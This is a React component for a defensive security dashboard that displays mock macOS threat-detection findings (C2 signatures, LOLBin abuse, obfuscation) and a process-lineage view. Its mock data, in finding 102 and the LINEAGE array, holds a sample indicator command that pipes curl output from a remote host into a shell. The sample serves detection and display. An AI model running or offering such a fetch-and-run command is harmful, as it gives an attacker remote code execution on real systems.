import { useState } from "react";
import { Terminal, ChevronRight } from "lucide-react";
import { PageHeader, FilterBar, FindingsTable, SectionHeading, type Finding } from "./shared";

const MOCK: Finding[] = [
  { id: 101, title: "Cobalt Strike beacon — csrss-helper", category: "process", severity: "critical", score: 9.7, mitre_technique: "T1071.001", mitre_tactic: "C2", agent_id: "mac-a1b2", first_detected_at: 1746574800, last_detected_at: 1746621600, status: "new", description: "Process signature matches CobaltStrike; PE header entropy 7.8, 96-byte heartbeat, no parent-visible window", epss_score: 0.96 },
  { id: 102, title: "Word.app → bash → curl pipe chain", category: "process", severity: "critical", score: 9.4, mitre_technique: "T1566.001", mitre_tactic: "Initial Access", agent_id: "mac-a1b2", first_detected_at: 1746618000, last_detected_at: 1746621600, status: "triaging", description: "Microsoft Word (PID 4421) → /bin/bash -c 'curl http://185.220.101.x/stage2|sh' — macro exploit IoC" },
  { id: 103, title: "Sliver C2 framework signature matched", category: "process", severity: "critical", score: 9.2, mitre_technique: "T1587.001", mitre_tactic: "Resource Development", agent_id: "mac-c3d4", first_detected_at: 1746610000, last_detected_at: 1746621600, status: "new", description: "Sliver implant detected via Go binary entropy + C2 profile header. Open-source C2 used by multiple threat actors." },
  { id: 104, title: "osascript executing base64-encoded payload", category: "process", severity: "high", score: 8.6, mitre_technique: "T1059.002", mitre_tactic: "Execution", agent_id: "mac-e5f6", first_detected_at: 1746605000, last_detected_at: 1746621600, status: "new", description: "osascript -e 'do shell script' with base64-decoded argument — common macOS LOLBin abuse pattern" },
  { id: 105, title: "Python script with obfuscated string concatenation", category: "process", severity: "high", score: 8.1, mitre_technique: "T1027", mitre_tactic: "Defense Evasion", agent_id: "mac-a1b2", first_detected_at: 1746600000, last_detected_at: 1746621600, status: "investigating", description: "python3 executing runtime-assembled command from split string literals — classic obfuscation to evade cmdline logging" },
  { id: 106, title: "Browser spawning child process at unusual path", category: "process", severity: "high", score: 7.9, mitre_technique: "T1189", mitre_tactic: "Initial Access", agent_id: "mac-g7h8", first_detected_at: 1746612000, last_detected_at: 1746621600, status: "triaging", description: "com.apple.WebKit.WebContent (Safari child) → /tmp/.update — drive-by download indicator (T1189)" },
  { id: 107, title: "nmap port scan from non-root process", category: "process", severity: "medium", score: 6.8, mitre_technique: "T1046", mitre_tactic: "Discovery", agent_id: "mac-g7h8", first_detected_at: 1746614400, last_detected_at: 1746621600, status: "new", description: "nmap executed by uid=501 — not matching any installed package. Post-compromise internal recon candidate." },
  { id: 108, title: "gcc compilation of unknown C source at runtime", category: "process", severity: "medium", score: 6.4, mitre_technique: "T1027.004", mitre_tactic: "Defense Evasion", agent_id: "mac-c3d4", first_detected_at: 1746616000, last_detected_at: 1746621600, status: "new", description: "gcc -o /tmp/.x /tmp/src.c executed at 03:12 local time — compile-and-run evasion against static analysis" },
];

// Parent-child lineage view data
const LINEAGE = [
  { parent: "Microsoft Word (4421)", child: "/bin/bash (4478)", grandchild: "curl http://185.220.101.x/stage2 (4489)", severity: "critical" },
  { parent: "Safari WebContent (3901)", child: "/tmp/.update (3955)", grandchild: null, severity: "high" },
];

export default function ExecutionThreats() {
  const [search, setSearch] = useState("");
  const [severity, setSeverity] = useState("");
  const [status, setStatus] = useState("");
  const [tab, setTab] = useState<"findings" | "lineage">("findings");

  const filtered = MOCK.filter(f =>
    (!severity || f.severity === severity) &&
    (!status   || f.status   === status)   &&
    (!search   || f.title.toLowerCase().includes(search.toLowerCase()))
  );

  return (
    <div>
      <PageHeader
        icon={<Terminal className="w-6 h-6 text-[--red-600]" />}
        title="Execution & Malware"
        subtitle="Process-level threats · C2 frameworks · LOLBin abuse · code injection"
        backstory="93% of malware incidents leave process-level evidence (Mandiant M-Trends 2024). This view surfaces C2 framework signatures (Cobalt Strike, Sliver, Havoc), LOLBin abuse via osascript/python/bash, obfuscated execution, and the most reliable indicator of compromise: an Office app or browser spawning a shell. A single parent→child rule match here warrants immediate containment investigation — legitimate software does not spawn shells from document processes."
        accentClass="border-l-[--red-600]"
        bgClass="from-[--red-50]"
        tactics={["TA0002 · Execution", "TA0005 · Defense Evasion", "TA0011 · C2"]}
        techniqueIds={[
          { id: "T1566.001", label: "Spear Phishing" },
          { id: "T1059",     label: "Command Interpreter" },
          { id: "T1071",     label: "App Layer C2" },
          { id: "T1027",     label: "Obfuscation" },
        ]}
        kpis={[
          { label: "C2 Signatures",     value: 2, color: "red"   },
          { label: "Parent→Child Rules",value: 2, color: "red"   },
          { label: "LOLBin Abuse",      value: 2, color: "amber" },
          { label: "Obfuscation Hits",  value: 2, color: "amber" },
        ]}
      />

      {/* Tab selector */}
      <div className="flex gap-1 mb-3">
        {(["findings", "lineage"] as const).map(t => (
          <button key={t} onClick={() => setTab(t)}
            className={`px-3 py-1.5 text-xs font-semibold rounded-md transition-colors capitalize ${tab === t ? "bg-[--red-600] text-white" : "bg-white border border-[--gray-200] text-[--gray-600] hover:bg-[--gray-50]"}`}>
            {t === "lineage" ? "Process Lineage" : "Findings"}
          </button>
        ))}
      </div>

      {tab === "findings" && (
        <>
          <FilterBar search={search} onSearch={setSearch} severity={severity} onSeverity={setSeverity} status={status} onStatus={setStatus} />
          <FindingsTable findings={filtered} />
        </>
      )}

      {tab === "lineage" && (
        <div className="space-y-3">
          <SectionHeading title="Process Lineage — Parent→Child Rule Matches" count={LINEAGE.length} color="red" />
          {LINEAGE.map((chain, i) => (
            <div key={i} className={`bg-white border rounded-lg p-4 shadow-card ${chain.severity === "critical" ? "border-l-4 border-l-[--red-600]" : "border-l-4 border-l-[--amber-500]"}`}>
              <div className="flex items-center gap-2 text-xs font-mono">
                <span className="px-2 py-1 bg-[--gray-100] rounded text-[--gray-700]">{chain.parent}</span>
                <ChevronRight className="w-3 h-3 text-[--red-500]" />
                <span className="px-2 py-1 bg-[--red-50] border border-[--red-600]/20 rounded text-[--red-700]">{chain.child}</span>
                {chain.grandchild && (
                  <>
                    <ChevronRight className="w-3 h-3 text-[--red-500]" />
                    <span className="px-2 py-1 bg-[--red-100] border border-[--red-600]/30 rounded text-[--red-800]">{chain.grandchild}</span>
                  </>
                )}
              </div>
              <p className="text-xs text-[--gray-500] mt-2">
                {chain.severity === "critical"
                  ? "Office document spawning shell — MITRE T1566.001 Spearphishing Attachment / macro execution"
                  : "Browser renderer spawning binary outside known paths — drive-by download IoC (T1189)"}
              </p>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
